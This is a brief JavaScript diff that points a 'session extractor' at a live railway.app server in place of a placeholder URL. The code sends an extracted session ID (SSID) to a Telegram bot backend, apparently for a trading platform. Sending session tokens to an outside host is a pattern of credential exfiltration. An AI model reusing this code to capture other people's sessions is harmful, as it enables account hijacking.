@@ -31,7 +31,7 @@ document.addEventListener("DOMContentLoaded", async () => {
             console.log("Extracted SSID:", event.data.ssid);
             
             // Send to the Telegram bot backend
-            fetch("https://yourdomain.com/api/store_ssid", {
+            fetch("https://quotex-session-extractor-production.up.railway.app:8080/api/store_ssid", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
